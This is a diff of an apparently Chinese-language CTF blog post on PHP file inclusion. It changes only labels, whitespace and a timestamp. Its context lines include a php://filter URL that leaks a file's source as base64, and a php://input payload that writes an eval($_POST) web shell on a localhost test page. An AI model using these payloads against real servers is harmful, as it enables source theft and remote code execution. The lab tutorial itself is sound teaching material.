@@ -219,7 +219,7 @@ if (!doNotTrack) {
     <header class="article-category">
         
             <a href="/categories/ctf/" >
-                CTF
+                ctf
             </a>
         
     </header>
@@ -484,10 +484,10 @@ if (!doNotTrack) {
 </span></span></span></code></pre></div><p>这里我们通过 <code>php://filter</code> 可以得到 <code>lrfiSession.php</code> 中以base64加密的内容，然后再解密得到其明文内容 <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/lrfiTest.php?filename=php://filter/read=convert.base64-encode/resource=lrfiSession.php
 </span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-05-21_22-56-31_screenshot.png" width="700px"/>
-</figure>
+    </figure>
  <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/2022-05-21_23-00-43_screenshot.png" width="700px"/>
-</figure>
+    </figure>
  <!-- raw HTML omitted --></p>
 <p>可用的过滤器列表： <!-- raw HTML omitted -->
 <a class="link" href="https://www.php.net/manual/zh/filters.php"  target="_blank" rel="noopener"
@@ -509,7 +509,7 @@ if (!doNotTrack) {
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/lrfiTest.php?filename=php://input
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">PHP</span> <span class="nx">fputs</span><span class="p">(</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;lrfiInput.php&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">),</span><span class="s1">&#39;&lt;?php eval($_POST[a]) ?&gt;&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="err">
 </span></span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-05-21_23-18-41_screenshot.png" width="700px"/>
-</figure>
+    </figure>
  <!-- raw HTML omitted --></p>
 </li>
 </ul>
@@ -627,7 +627,7 @@ if (!doNotTrack) {
 
 
         <span>
-            Last updated on May 22, 2022 10:02 BST
+            Last updated on May 22, 2022 10:02 &#43;0100
         </span>
     </section></footer>
 
